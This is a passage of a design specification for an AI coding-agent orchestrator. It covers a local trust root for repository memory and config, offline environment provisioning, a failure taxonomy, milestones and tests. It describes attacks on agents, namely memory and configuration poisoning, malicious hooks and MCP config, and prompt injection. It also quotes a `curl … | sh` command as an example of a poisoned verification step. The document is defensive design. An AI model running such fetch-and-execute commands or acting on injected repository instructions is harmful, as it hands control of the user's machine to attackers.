never grants a provider `BROKERED_TOOLS`** (P-37, I-23). Mode is decided by S-07 alone; the sandbox
runs underneath whichever mode results.

---

## 15. Memory and knowledge

Canonical memory is Markdown in `<project>/.aidev/memory/`, committed to the project repo, indexed
in FTS5 (D-18). It doubles as the **stable prefix content** for project invariants (§8.1), so
memory quality directly buys cache efficiency.

### 15.1 Local trust root (P-22, I-14)

Because memory is committed to the repository *and* is inserted at instruction level, a malicious
branch, a compromised dependency that ships a patch, or a hostile PR can rewrite what aidev later
treats as authoritative truth. The same applies to `.aidev/project.toml`, which declares executable
verification commands. This is memory and configuration poisoning, and v2.0 left it open.

**The trust root is local, never in the repository.**

```text
~/.aidev/aidev.db :: trusted_content    ← approved hashes, keyed by project (daemon-owned)
<project>/.aidev/memory/*.md            ← proposals
<project>/.aidev/project.toml           ← proposal
```

On every run start, for each repo-owned aidev file:

```text
hash matches an approved entry
   └─► trusted: memory enters the instruction-level prefix;
                project.toml commands are executable

hash is new or changed
   └─► untrusted: content enters context as REPOSITORY_CONTENT (data, never instruction)
       commands do NOT execute — verification falls back to the last approved
       configuration, or fails loudly if there is none
       a trust prompt is surfaced showing a diff of what changed
```

`aidev trust review` shows the diff, `aidev trust approve <path>` records the new hash with a
timestamp and supersedes the prior one. Approval is per-file and per-content — approving one memory
edit does not bless the next one.

Two rules that matter more than they look:

- **A changed `generic_commands` entry never runs on arrival.** The attack is
  `test = "curl … | sh"` landing in a checkout and executing during verification. Under the trust
  root it cannot.
- **Unapproved memory is still useful** — it enters as repository data, so the model can read it,
  but it cannot instruct. The degradation is graceful, not a hard stop.

A memory promotion (§15.2) writes through `tmp → fsync → atomic rename`, then records the resulting
content hash as approved in the daemon DB transaction. A crash between the rename and the DB commit
leaves an **unapproved proposal** — never a silently trusted file — and the next run surfaces it for
reconciliation. The human's approval attaches to the candidate content before the write; filesystem
and SQLite atomicity are not conflated into a single promise they cannot jointly keep.

### 15.2 Promotion

**Promotable:** architecture invariants, domain vocabulary, security invariants, data ownership, API
guarantees, testing rules, supported commands, deployment constraints, ADR summaries, known
dangerous assumptions.

**Never automatic:** unverified model conclusions, reviewer speculation, raw external text, secrets,
transient errors, user-private content.

```text
successful run → candidate extraction → evidence refs (file+symbol+SHA)
              → contradiction & staleness check → human approval (mandatory for
                architecture/security) → canonical memory + FTS index
```

Records store `source_refs` and `validated_git_sha`. When a referenced object changes, the record is
marked `possibly_stale` — never silently deleted, never silently trusted. Stale records enter
context with a marker and reduced priority. **A memory edit changes the cached prefix**, so
promotion bumps the project prefix version and invalidates warm sessions; batch promotions at run
completion rather than mid-task.

---

## 15A. Environment provisioning (P-26, P-31, I-21)

A git worktree isolates *source*. It does not isolate *environment*, and v2.0 conflated the two. A
fresh worktree has no virtualenv, no `node_modules`, no compiler cache, no generated artifacts — and
because steady-state verification denies network (D-21), it cannot fetch them. As written, v2.0's
verification stage could not run at all on the first task in a worktree.

### Environment identity (P-31)

Lockfiles alone are insufficient: the same lockfile resolves to incompatible native and runtime
environments across platforms and toolchains. v3.0 keyed on the lockfile hash and would have happily
reused a Linux x86-64 environment on macOS arm64.

```text
EnvKey = H(canonical({
  lockfile_set_and_hashes,
  os, architecture,
  runtime_versions,                      # python, node, …
  package_manager_versions,              # uv, npm, pnpm, cargo, …
  compiler_or_native_toolchain_versions, # cc, rustc, SDK
  selected_features_or_extras,
  environment_relevant_project_config
}))
```

Reuse requires an **exact** `EnvKey` match (I-21). The canonical fingerprint is stored alongside the
environment and forms S-06's compatibility fixture matrix.

### Storage and publication

```text
~/.aidev/envs/<project-id>/.tmp/<provision-id>/   writable while provisioning
~/.aidev/envs/<project-id>/<env-key>/             immutable after validation + atomic rename
    ├── venv/ | node_modules/ | .cargo/ | package-store/
    └── manifest.json                              fingerprint + provenance + validation record

<worktree>/scratch/
    ├── build-cache/                               worktree-local, writable, disposable
    ├── .pytest_cache/ .mypy_cache/ .tsbuildinfo
    └── links/materialised view → the shared store
```

Provision into `.tmp`, validate imports and runtime, write and fsync the manifest, **then** atomic
rename into the final `EnvKey` directory. A crash may leave garbage in `.tmp`; it must never make a
partial environment visible as valid.

| Property | Rule |
|---|---|
| Identity | Platform-complete `EnvKey`, never lockfiles alone |
| Sharing | Share the immutable environment only where the ecosystem proves it safe; otherwise share the package/cache store and cheaply materialise a worktree-local view |
| Provisioning | The **only** dependency-restoration stage permitted network access. Gated by the Broker's `pkg.install` verb, journaled, and run through the M2 substrate — never during a model-driven stage (P-30) |
| Mutation | Published state is immutable. A changed dependency, runtime, or toolchain yields a new `EnvKey` |
| Writable caches | Worktree-local under `scratch/`, disposable, never shared across concurrent worktrees |
| **Leases** | A run acquires an `env_lease` on the environment it uses and releases it at terminal state. **Eviction never reclaims a leased environment** — v3.0 promised this without a mechanism; the `env_lease` table (§12.5) is the mechanism |
| Eviction | LRU by `last_used_at` among unleased environments, bounded by configured total size |
| Cache warmth | A reused env is also a warm type-daemon opportunity: the daemon starts before the model call returns |

### Consequences

- **First provision of a new `EnvKey` is slow and networked.** It is visible, Broker-authorised,
  journaled, and reported **separately** from steady-state fast-path latency. E-01 breaks it out.
- **Steady-state verification is fully offline.** Tests, type checks, and lint run with network
  denied — the security property and the hermeticity property are the same property.
- **A dependency, runtime, or toolchain change is a first-class event**, not an implicit side effect
  of running tests.

S-06 covers cold provision, warm reuse and materialisation, `EnvKey` compatibility across the
supported OS/arch/runtime/toolchain matrix, atomic publish and crash recovery, steady-state disk
footprint, and verification with network denied.

---

## 16. Observability and accounting

### 16.1 Ship in M0 (P-18)

Per model call: provider · model · effort · session key · prefix hash · input tokens · **cache-read
tokens** · **cache-creation tokens** · reasoning tokens · output tokens · wall ms · tool count.

Per phase: the `phase_timing` segments — startup, static, model, tool, test, typecheck,
orchestration.

Without these, every decision in §3.2 is unfalsifiable.

### 16.2 Cache health (P-17, P-21)

Do not collapse cache behaviour back into one number — the three concepts fail for different reasons
and a single ratio hides which one broke.

```text
process_warm:
    startup_ms_avoided ; warm_process_hit : bool

project_prefix_cached:
    invariant_cache_read_tokens / invariant_block_tokens

task_context_cached  (calls 2..N only):
    task_cache_read / (task_cache_read + task_cache_creation + task_uncached_input)
```

**The >0.8 target applies to `task_context_cached` on call 2+**, measured on the forced-repair
fixture. A one-call task cannot demonstrate task-context reuse and **must not be recorded as a cache
failure**; it reports process warmth and project-prefix behaviour only. A combined provider ratio may
be shown as diagnostic telemetry, but it is not the product invariant.

Track inter-call gaps against the **measured** provider TTL (S-04). A rising gap p90 may justify a
longer TTL where the provider offers one and the write-premium economics justify it. Provider cache
defaults have changed silently before and materially raised cache-creation cost; treat a sudden
concept-specific drop as provider drift until disproven.

### 16.3 Accounting semantics (D-33)

```text
ACTUAL PAYMENT MODEL   subscription plans
OBSERVED USAGE         tokens, cache split, sessions, rate-limit events
API-EQUIVALENT COST    hypothetical list-price comparison, always labelled
```

Provider dollar figures are client-side list-price estimates. The UI renders "≈$X at API list
prices", never "this task cost $X".

Note for subscription operation: cached reads generally do not consume the same rate-limited
throughput as fresh input on current models, which means cache optimisation relieves the *actual*
constraint, not merely a hypothetical bill. Verify per model in S-01 — at least one older small
model is an exception.

### 16.4 Logging policy (D-32)

```text
ON:  metadata, token and cache stats, tool metadata, context item ids, decisions, timings
OFF: full prompts, full model outputs (opt-in, stored as local artifacts only)
ALWAYS REDACTED: tool output, environment values
NEVER: secrets, credentials, tokens
```

Redaction runs on write, with a shared redactor and a test corpus of known secret shapes.

### 16.5 Metrics

**Leading quality:** first-pass verification rate · repair rate · path-escalation rate ·
localizer **gold** recall@10 and precision@10 (P-33) · `used_in_patch` utilization · closure-failure
rate · `context_gap` rate · deterministic-finding rate · policy denial rate.

**Lagging quality:** post-merge defects, hotfixes, reverts, security issues, incidents. Recorded via
`aidev outcome <run> --clean|--defect|--revert` — the only honest ground truth.

**Efficiency:** time to READY by class · model calls per task · tokens per verified task by class ·
cache health split by `process_warm` / `project_prefix_cached` / `task_context_cached` · phase time
distribution · test selection ratio (impacted/total) · cold-provision time reported separately.

Objective: `minimize(time_to_verified_success + token_use)` subject to
`quality ≥ threshold` and `required gates preserved`. Never one opaque score.

---

## 17. Failure taxonomy and retry policy

| Class | Detection | Action | Max |
|---|---|---|---|
| `provider_rate_limit` | retry event / 429 | backoff with jitter; raise quota pressure | 5 |
| `provider_transient` | 5xx, reset | backoff | 3 |
| `provider_auth` | auth error | stop; tell the user how to re-auth | 0 |
| `session_expired` | prefix cache miss + TTL exceeded | rebuild prefix, record re-write cost | 2 |
| `prefix_mismatch` | hash assertion failed (I-11) | hard error; this is a bug, not a retry | 0 |
| `worker_timeout` | wall clock exceeded | SIGINT→SIGTERM; retry once at +1 effort | 1 |
| `schema_invalid` | structured output fails validation | one repair turn with the validation error | 1 |
| `patch_base_mismatch` | `expected_base_blob_sha` ≠ actual (P-34, I-20) | **never fuzzy-apply**; re-localize once if the drift is explainable, else escalate | 1 |
| `patch_result_mismatch` | `expected_result_sha` ≠ post-apply hash | revert the operation set; escalate — the applier or the model disagree about the edit | 0 |
| `closure_unsatisfiable` | predicate fails within budget | escalate to heavy path | 0 |
| `postdiff_promoted` | aggregate class ≥ R2, `force_heavy`, `context_gap`, or size ceiling (P-28) | restore pre-IMPLEMENT checkpoint; escalate with the patch as evidence only | 0 |
| `verification_failed` | check exit non-zero | repair with failing evidence, **returning through POSTDIFF** (I-19) | 1 (fast) / 3 (heavy) |
| `verification_flaky` | inconsistent re-run | re-run once; no repair budget consumed | — |
| `diff_too_large` | > size ceiling | escalate; suggest task split | 0 |
| `policy_denied` | broker deny | do not retry; re-plan or gate | 0 |
| `gate_rejected` | human said no | stop; record reason as re-plan context | 0 |
| `workspace_conflict` | worktree/base mismatch | reconcile to checkpoint | 1 |
| `trust_unapproved` | repo `.aidev` content hash not in the trust root (P-22, I-14) | do **not** execute; fall back to the last approved config or fail loudly; surface a trust prompt | 0 |
| `env_key_mismatch` | no environment with an exact `EnvKey` (P-31, I-21) | provision a new environment through the Broker; never reuse a near-match | 1 |
| `env_provision_failed` | validation failed before publish | discard `.tmp`; nothing is published; report | 1 |
| `action_unknown_external` | non-idempotent **external** attempt left `UNKNOWN` (P-23, I-15) | **halt in `BLOCKED_HUMAN`** for reconciliation; never replay | 0 |
| `action_generation_voided` | workspace-local attempt **above the checkpoint watermark** in a rolled-back generation (P-39, I-25) | mark `void`; re-derive from intent under a new `attempt_seq`. Attempts at or below the watermark are untouched. Not an error | n/a |
| `interception_unproven` | a role requests `BROKERED_TOOLS` from a provider that failed S-07 (P-37, I-23) | refuse the mode; fall back to `PATCH_ONLY` with precompiled context. **A sandbox does not unblock this** | 0 |
| `tool_unavailable` | binary missing | degrade the plan and record; never silently skip a required check | 0 |
| `internal_invariant` | assertion failure in core | fail loudly, preserve state, no auto-retry | 0 |

**A retry must change something** — more evidence, higher effort, different capability, narrower
scope. Identical repetition is a bug; a test asserts consecutive attempts differ in at least one
dimension.

---

## 18. Build plan

Ten milestones. The order changed from v1.0: the **static analysis core moved to M3** (before real
workers), because everything it answers is an answer nobody pays for, and the **fast path completes
at M6** so the product is useful and measurable months before the heavy path exists.

Sizes: S ≈ days, M ≈ 1–2 weeks, L ≈ 2–4 weeks at single-developer pace.

### M0 — Skeleton, vertical slice, and instrumentation · **L**

**Goal:** a complete R0 run end-to-end with fake workers, *fully instrumented*. The instrumentation
is not optional polish — without it, every decision in §3.2 is unfalsifiable (P-18).

Deliverables: package scaffold and `uv` packaging · SQLite store with migrations and pragmas ·
event log and content-addressed artifacts · Pydantic contracts · fast-path state machine ·
stage attempts, checkpoints, transactional commit · `FakeWorker` (scripted, deterministic) ·
daemon on a Unix socket · **token + cache + `phase_timing` accounting** · `aidev run/status/events/
show/cancel` · crash-recovery loop.

Exit:
- [ ] `aidev run` reaches `READY` with the fake worker; all artifacts stored and schema-valid.
- [ ] `kill -9` at every state boundary; each restart resumes correctly with no duplicated artifacts
      or lost events. Parametrised test.
- [ ] Every run produces an itemised token report (input/cache-read/cache-creation/output per call)
      and a phase-timing breakdown.
- [ ] Only the daemon holds a DB write connection (I-02 test).

### M1 — Workspace · **M**

Worktree create/remove/prune · branch naming · base resolution with dirty policy · checkpoint
commits · reconciliation · **logical quarantine / sanitized worker view** for repo-supplied agent
config (P-36) · `aidev diff|apply|gc`.

Exit:
- [ ] A run on a dirty checkout leaves `git status --porcelain` and file mtimes unchanged.
- [ ] Reconciliation restores the exact checkpoint SHA after injected divergence.
- [ ] `.claude/`, `.mcp.json`, `.codex/`, `AGENTS.md`, `CLAUDE.md` are logically quarantined and
      recorded **without appearing as deletions or modifications in the primary worktree diff**.

### M2 — Security substrate: Broker, policy, trust root, journal, egress · **L**

Deliberately broader than v3.0's M2, because **M3 performs the first networked provisioning** and the
boundary must exist before the first external effect (P-30).

Verb taxonomy · decision pipeline · path canonicalisation with symlink-escape tests · **argv-only
`proc.exec`** with resolved-path allowlists, typed per-program argument schemas, and a closed wrapper
enumeration · env builder · tool-network default-deny · frozen gate list · gate presentation and
resolution · tighten-only policy merge · **local trust root** · **durable action journal** ·
**control-plane / tool egress split**.

Exit:
- [ ] No model-produced string can reach a shell; no model-controlled `shell=True` or shell-string
      call site exists (I-13). Shell metacharacters are inert argv bytes.
- [ ] A red-team suite of ≥25 attempts is denied: symlink escape, traversal, executable substitution,
      wrapper abuse, out-of-root read and write, and attempts to smuggle shell execution through argv.
- [ ] `build_env()` asserts the exact key set; static audit proves no project-command spawn path
      bypasses it (I-04).
- [ ] Every frozen gate verb renders all five fields; project policy cannot weaken a frozen invariant.
- [ ] A changed or unapproved `.aidev/project.toml` cannot execute a verification or provisioning
      command; approval is content-hash-specific (I-14).
- [ ] Fake external actions exercise `PLANNED→AUTHORIZED→STARTED→terminal|UNKNOWN`; restart reuses the
      same logical `action_id` and never replays an ambiguous non-idempotent effect (I-15, I-22).
- [ ] **`rollback_to_checkpoint()` is the single rollback implementation**, used by crash recovery
      and by POSTDIFF promotion. A grep/static audit proves no other code path resets the worktree.
- [ ] **Watermark cut is exact (I-25).** Two-write fixture: one `fs.write` below the checkpoint's
      `action_attempt_watermark`, one above. After rollback the below-watermark attempt keeps
      `SUCCEEDED` and is **not** re-derived; the above-watermark attempt is `void` and is re-derived
      under a new `attempt_seq`. Run the fixture through both rollback callers.
- [ ] A config file containing `agent_config_files` is **rejected at load**; no approval path can
      make repo-native agent config execute (I-10, P-41).
- [ ] Control-plane egress and tool egress are separate policy paths; the latter is denied by default.

### M3 — Static analysis core · **L** · ★ the differentiator

**Gated on S-05, S-06, and a written assessment contract (P-19). Uses the M2 trust root, journal,
and egress substrate for provisioning (P-30).**

Localizer (import graph, symbol closure, co-change, path rules, ripgrep fallback) · **closure
predicate** with pyright/ts-morph resolvers · **`PreflightFacts` / `PostDiffFacts` as distinct
types** · preflight and post-diff classifiers · risk floors with `risk_floor` / `force_heavy` split ·
**TIA computed twice** with a single full-suite fail-safe · environment provisioning with
platform-complete `EnvKey` (§15A) · `localization_result`
(`used_in_patch` plus optional independent `gold_relevant`) and `assessment` recording.

Exit:
- [ ] Localizer produces ≤10 candidates; **independent gold** recall@10 and precision@10 measured on
      the labelled corpus. `used_in_patch` is reported separately as utilization, never as ground
      truth (P-33).
- [ ] Closure predicate computed with **zero model calls** (I-12 audit test).
- [ ] **The preflight scorer cannot access diff-derived fields — enforced by type, and a test
      asserts a `PostDiffFacts` field is unreachable from preflight code (I-16).**
- [ ] **Classifiers are gated on directional error, not accuracy** (P-40, E-03). Overall accuracy
      hides the only failure that matters: 95% accuracy whose five errors are all *actual R2 →
      predicted R1* is a safety failure, not a pass.
      - Post-diff (authoritative, gates verification): **R2+ recall ≥ 0.98 and R3 recall = 1.0 on the
        held-out set**, with the underclassification rate bounded by a one-sided 95% upper confidence
        limit below the configured maximum. Accuracy is reported, never gating.
      - Preflight (provisional, caught downstream by post-diff): ≥85% accuracy **and** R2+ recall
        ≥0.80 before the ambiguous-band tie-break is retired. Its false negatives cost efficiency;
        post-diff's cost safety. The two are gated differently on purpose.
- [ ] Each floor rule has positive and negative fixtures, and `force_heavy` is asserted separately
      from `risk_floor`.
- [ ] TIA falls back to **full suite** — never an intermediate set — on manifest change, stale map,
      `force_heavy` floor, and post-diff files outside the preflight candidate set.
- [ ] A worktree using an exact-match platform-complete `EnvKey` can type-check and run tests **with
      network denied**; a mismatched OS/arch/runtime/toolchain fingerprint cannot reuse it (I-21).
- [ ] Provisioning runs through the Broker and is journaled; a crash mid-provision leaves nothing
      published.

### M4 — Worker runtime · **L** · **gated on S-01, S-02, S-03, S-04, S-07, S-08**

Three-concept cache model · session pool with fork and TTL watchdog · **`PATCH_ONLY` and
`BROKERED_TOOLS` execution modes** · Claude worker · Codex worker · capability probe ·
structured-output path · streaming parser · cancellation semantics · usage and cache extraction ·
model registry · untrusted-repo hardening · **hash-guarded patch applier** · integration with the
M2 trust root, journal, and egress substrate.

Exit:
- [ ] A fast-path task completes in `PATCH_ONLY` with **zero model-visible tools**, from a neutral
      cwd. A repository canary and a home-directory canary — both omitted from the context packet —
      are unreachable to the model. Every file change is an aidev Broker decision (P-20, P-29, I-18).
- [ ] Stale-base injection: a patch whose `expected_base_blob_sha` no longer matches **never
      fuzzy-applies**; it re-localizes once or escalates (I-20).
- [ ] **Cache is tested with a forced-repair fixture**, not a one-call run: a task driven to two
      model calls shows cache-read ratio > 0.8 on call 2. A one-call task reports
      `project_prefix_cached` only, and the metric names which concept it measured (P-21).
- [ ] Invariant-block hash identical across every call in a task; deliberate mutation raises
      `prefix_mismatch` (I-11).
- [ ] **S-07 outcome is recorded per provider.** Any provider without proven interception is
      configured `PATCH_ONLY` in the registry, and a test asserts it cannot be set to
      `BROKERED_TOOLS`.
- [ ] Malicious hook + malicious MCP config + **malicious `.aidev/project.toml`** produce zero
      execution — three canary files, none created (I-10, I-14). Logical quarantine produces no
      artificial diff entries (P-36).
- [ ] **S-08 canaries pass for every provider enabled in a given mode.** `PATCH_ONLY`: no usable
      read or exec surface, canaries unreachable. `BROKERED_TOOLS`: cannot read auth material, cannot
      read outside declared roots, cannot reach an unapproved host — while the model call succeeds. A
      provider that fails is **disabled for that capability, not granted an exception** (I-17, I-18).
- [ ] Crash injected between `STARTED` and terminal for each verb class; recovery reconciles
      content-addressable and idempotent actions, and halts on non-idempotent external ones (I-15).
- [ ] Cancellation: SIGINT ends the turn and records usage; SIGTERM fallback exits cleanly; no
      orphan processes.
- [ ] Session pool survives a worker version change by invalidating and rebuilding.

### M5 — Verification engine · **M**

Adapter interface · python/node/generic adapters · **warm type-checker daemon** with lifecycle ·
fail-fast ordering · gitleaks/osv/semgrep · evidence capture · flaky handling · risk matrix.

Exit:
- [ ] `READY` unreachable without a stored passing `VerificationReport` (I-06 test).
- [ ] Warm type-check on a changed file completes in single-digit seconds after daemon warm-up;
      cold-check path is unreachable on the fast path.
- [ ] Fail-fast aborts on first hard failure and routes to repair with that evidence.
- [ ] A project with no detectable adapter falls back to `generic` or fails loudly.

### M5.5 — Eval-lite · **S** · ★ the gate arrives before the decisions do

A headless paired runner over roughly 40 tasks; no dashboard, no OTel, no full statistics. Its
purpose is to catch **gross regressions** before M6 and M7 set routing, prompting, review, and
heavy-path behaviour. It is explicitly **not** licensed to claim a −2pp non-inferiority result from
an underpowered sample (P-32).

Deliverables: corpus loader · headless paired runner · end-to-end accounting that **includes
escalated and failed fast-path attempts** · a predeclared **early guardrail** (default: reject when
the lower credible bound on paired pass-rate difference falls below −10pp) · sample-size and
interval-width reporting.

Exit:
- [ ] Two configurations compared headlessly, producing token, latency, pass-rate, and escalation
      deltas **with uncertainty intervals**.
- [ ] The early guardrail and the final −2pp target are written down **before** the first comparison,
      and are documented as two different claims.
- [ ] A fast-path run that escalates is counted at **full end-to-end cost** — no survivorship
      filtering.
- [ ] When the interval is too wide for the −2pp question, the result is reported `UNDETERMINED`.
      M5.5 may still pass its gross-regression guard; no final non-inferiority claim is made.

### M6 — Fast path complete + first measurement · **M** · ★ the product becomes real

Wire M3+M4+M5 into the ≤3-call pipeline · effort tiering · verify-keyed escalation · diff-size
ceiling · escalation-to-heavy stub · **run E-01 and E-02**.

Exit:
- [ ] R0 and R1 tasks complete on the fast path against a real project.
- [ ] Measured against solo-agent baseline on ≥20 R0 and ≥20 R1 tasks, **with repeats where model
      variance matters**, reporting speed and token ratios with intervals. **If they miss §2.1, the
      cause is documented and the next milestone is a fix, not a feature.**
- [ ] **Escalated runs are included in the fast-path totals** (P-27); the report states the
      escalation rate alongside the ratios.
- [ ] Median fast-path model calls ≤ 2.
- [ ] Post-diff promotion is exercised end to end: an R1 task that wanders into auth restores the
      pre-IMPLEMENT checkpoint and enters the heavy path with the patch as evidence only.
- [ ] **Repair reassessment is exercised end to end:** a repair that touches a new risky file returns
      through POSTDIFF and escalates *before* verification (I-19).
- [ ] Cold environment provisioning is reported **separately** from steady-state latency.

### M7 — Heavy path · **L** · **`BROKERED_TOOLS` requires S-07; a sandbox cannot substitute**

v5.0 said M7 could ship heavy-path tool access if **either** S-07 proved interception **or** an OS
sandbox existed. That contradicted §8.3 and D-19, and it was the single most dangerous sentence in
the document. The two mechanisms solve different problems and are not interchangeable:

| Mechanism | Provides |
|---|---|
| **Broker interception** | Authority, per-action policy, auditability, the decision record `READY` depends on |
| **OS sandbox** | Blast-radius containment *if* something escapes that policy |

A sandbox bounds what a bypass can damage. It does not produce a decision, does not consult policy,
and leaves no per-action record. It is therefore defence in depth, never a grant of authority (P-37,
I-23).

**M7 rule:** `BROKERED_TOOLS` ships only where S-07 proved interception for that provider. If S-07
fails, that provider stays `PATCH_ONLY` **regardless of sandbox availability**, and its architects
and reviewers receive richer precompiled context instead of read tools. Independently of S-07, the
strict OS sandbox (bubblewrap / rootless podman / macOS profile) may be made mandatory for R2/R3 and
pulled from M9 into M7 — as a second layer under whichever mode is in force, not as a licence.

Full FSM stages (design, challenge, independent test plan) · reviewer packet with exclusion rules ·
review levels by class · specialist triggers · finding lifecycle · adjudication · re-verification ·
hard-bug workflow · conditional-review trigger at R1.

Exit:
- [ ] Reviewer context provably excludes builder reasoning (packet inspection test).
- [ ] No fix applied from an unadjudicated finding; every fix re-verified before `READY`.
- [ ] Hard-bug workflow refuses to patch during diagnosis and requires a failing regression test.
- [ ] R1 review fires only when a deterministic finding exists (P-14 test).

### M8 — Evaluation and observability · **L**

TUI with live events · local dashboard · OTel exporter (optional) · eval corpus ≥30 tasks with
hidden tests · paired runner · beta-binomial and bootstrap statistics · **baseline for every metric
in §16.5** · derived p50/p95 SLOs · run E-04, E-05, E-06.

Exit:
- [ ] Baseline report exists for the full corpus on the default configuration.
- [ ] Two configurations compared with paired statistics and credible intervals.
- [ ] A secret-shaped string in tool output never appears in logs (redaction corpus test).
- [ ] Dashboard stays interactive at ≥1000 synthetic runs.

**From here, D-34 is active: no routing, prompt, effort, ceiling, or gate change ships without
paired eval evidence.**

### M9 — Hardening and optimisation · **L**

Each item individually gated by M8 evidence: parallel DAG inside heavy-path IMPLEMENT with
predicted read/write sets · co-change model retraining automation · DuckDB analytics over exported
Parquet · localizer weight tuning from **independent gold labels**, with `used_in_patch` only as auxiliary
utilization telemetry (P-33) · long-TTL policy per project from measured gap p90 against measured TTL ·
remaining OS sandbox backends not already pulled into M7.

Exit:
- [ ] Every shipped optimisation has paired eval showing no quality regression.
- [ ] Strict sandbox profile available and enforced for R3.

### 18.1 Dependency graph

```text
                    S-05, S-06                S-01, S-02, S-03, S-04, S-07, S-08
                         │                                    │
                         ▼                                    ▼
M0 ──► M1 ──► M2 ──► M3 ──► M4 ──► M5 ──► M5.5 ──► M6 ──► M7 ──► M8 ──► M9
                                              │              ▲
                                     eval gate arrives    S-07 REQUIRED for BROKERED_TOOLS
                                     before the decisions  OS sandbox = additional defence,
                                     it governs            never a substitute (P-37)
```

Do not reorder. Specifically: the **broker before real workers** (no model runs without the
boundary), the **static core before workers** (it removes calls rather than optimising them),
**eval-lite before the milestones whose behaviour it judges**, and **a real boundary before heavy
workers**.

M0–M2 are unblocked today; M2 now carries the trust/journal/egress substrate that provisioning needs.
M3 needs S-05/S-06 and the written assessment contract. M4 needs all six of its spikes. **S-07 failure
restricts heavy-path tooling; S-08 failure disqualifies a provider from fast-path implementation.**
Neither invariant is weakened to make a provider fit.

---

## 19. Testing strategy

| Level | Scope |
|---|---|
| Unit | Floors, canonicalisation, argv policy, derivation, closure predicate, prefix builder, redaction |
| Contract | Every artifact against exported JSON Schema, versions N and N-1 |
| State | Every transition and guard; property test over random event sequences |
| Crash | Injected `kill -9` at every boundary and mid-call |
| Cache | Prefix hash stability; deliberate mutation raises; TTL expiry path records re-write |
| Adapter | Recorded real event streams replayed offline |
| Red-team | Escape attempts, injected hooks, malicious MCP config, prompt injection in comments — canary assertions |
| Static | Localizer gold recall@10/precision@10; classifier **confusion matrix** with directional underclassification and false-escalation rates (P-40) |
| Integration | Full runs on fixture repos with `FakeWorker` — deterministic, no network |
| Live smoke | Small real-provider set, nightly, quota-aware |
| Eval | The M8 corpus, on demand |

`FakeWorker` is a first-class component, not a mock: it reads a YAML script of events and is used by
every integration test. Behaviour that only works with a real provider is a design smell.

### 19.1 Invariant → test matrix

Every invariant in §2.4 claims a named enforcing test. Here they are; an invariant without a green
test is an invariant the plan does not actually have.

| Invariant | Test | Milestone |
|---|---|---|
| I-01 | No LLM call reachable from any guard — static call-graph audit | M0 |
| I-02 | Write-connection audit; CLI opens read-only | M0 |
| I-03 | Path-escape fixtures; write outside worktree denied | M2 |
| I-04 | `build_env()` exact-key assertion + grep audit for other spawn sites | M2 |
| I-05 | Floor-lowering attempt rejected and recorded | M3 |
| I-06 | `READY` unreachable with no passing `VerificationReport` | M5 |
| I-07 | Prompt assembler raises on untrusted-in-instruction-position | M4 |
| I-08 | Crash injection at every stage boundary | M0 |
| I-09 | Frozen gate list is a constant; config mutation attempt fails at load | M2 |
| I-10 | Malicious hook + `.mcp.json` canary files never created; config schema rejects any opt-in key | M2 (schema) / M4 (canary) |
| I-11 | Invariant-block hash equal across calls; deliberate mutation raises | M4 |
| I-12 | Enumerated permitted model call sites; any new call site fails the audit | M3 |
| I-13 | No `shell=True` / shell-string call site reachable from model input | M2 |
| I-14 | Mutated `.aidev/project.toml` neither executes nor instructs | M2 |
| I-15 | Crash injected at each action state per verb class; journal terminal or halted | M2 |
| I-16 | `PostDiffFacts` field unreachable from preflight code — type-level | M3 |
| I-17 | S-08 credential + egress canary, both providers, both OSes | M4 |
| I-18 | Tool-surface contract asserts empty schema on fast path; repo + home read canaries unreachable | M4 |
| I-19 | FSM property test: no path from `REPAIR` to `VERIFY` that skips `POSTDIFF` | M0 (fake) / M6 (real) |
| I-20 | Stale-base injection: patch refuses to apply, never fuzzy-applies | M4 |
| I-21 | `EnvKey` fixture matrix across OS/arch/runtime/toolchain; near-match refused | M3 |
| I-22 | Retry and recovery reuse the same `action_id`; repeated action gets a new one | M2 |
| I-23 | Registry refuses `BROKERED_TOOLS` for an S-07-failing provider, sandbox present or not | M4 |
| I-24 | Repair fixture: both post-diff assessments persist; neither is clobbered | M0 (fake) / M6 |
| I-25 | Two-write fixture across both rollback callers: below-watermark attempt survives, above-watermark attempt voids and re-derives; single-primitive audit | M2 |

---

## 20. Configuration

`~/.aidev/config.toml`:

```toml
[daemon]
socket = "~/.aidev/aidev.sock"
prewarm_projects = ["~/code/acme-api"]

[workers]
default_provider_order = ["claude", "codex"]
session_idle_timeout_s = 900
wall_clock_limit_s = 900

[cache]
# Concept-specific (P-17/P-21). There is no single "cache hit ratio".
task_context_target_ratio = 0.8         # calls 2+ only; a one-call task is not a failure
project_prefix_min_ratio  = 0.9
# Longer TTLs are evaluated from MEASURED provider behaviour (S-04), never assumed.
evaluate_long_ttl_when_gap_p90_exceeds_measured_ttl = true

[trust]
prompt_on_change = true                 # surface a diff; never auto-approve
fail_closed_without_approved_config = true

[env]
max_store_gb = 40
evict_unleased_lru = true               # never evicts a leased environment

[fastpath]
max_model_calls = 3
max_context_files = 10
max_diff_lines = 400
effort = { r0 = "minimal", r1 = "low" }

[limits]
max_repairs_fast = 1
max_repairs_heavy = 3

[logging]
store_prompts = false
store_model_output = false
```

`<project>/.aidev/project.toml`:

```toml
[project]
name = "acme-api"
languages = ["python", "typescript"]

[verify]
adapters = ["python", "node"]
generic_commands = { build = "make build", test = "make test" }
typecheck_daemon = "pyright"

[impact]
strategy = "import_graph"        # import_graph | coverage | none
failsafe_paths = ["pyproject.toml", "uv.lock", "package-lock.json", "conftest.py"]

[localize]
max_files = 10
cochange_enabled = true

[risk]
blast_radius_file_threshold = 15

[context]
read_roots = ["src", "tests"]
exclude = ["vendor/**", "**/generated/**"]

[allow]
network_domains = []             # tool egress; provider egress is separate (P-25)
# NOTE: there is deliberately no `agent_config_files` opt-in in v1 (P-41).
# Repo-native Claude/Codex config never executes, by any approval path.
```

`policy.yaml` (user and project, tighten-only merge):

```yaml
risk:
  thresholds: { r3_critical_count: 1, r3_high_count: 2 }
gates:
  # Typed Broker vocabulary — NOT tool-name globs. There is no `Bash(...)` surface (P-24, I-13);
  # model-originated execution is argv only. Exact schema settles in M2.
  additional:
    - { verb: proc.exec, program: kubectl }
    - { verb: git.write, operation: push }
verbs:
  deny: ["net.fetch", "pkg.install"]
```

---

## 21. CLI surface

| Command | Purpose |
|---|---|
| `aidev run "<task>"` | Start a run (`--class`, `--heavy`, `--dry-run`, `--attach`) |
| `aidev status [run]` | State, phase, risk, pending gates |
| `aidev events <run>` | Ordered trace (`--follow`, `--type`) |
| `aidev show <run> <artifact>` | Render a stored artifact |
| `aidev cost <run>` | Itemised tokens, cache split, phase timings |
| `aidev diff <run>` / `apply` | Diff against base; branch or patch in the user's repo |
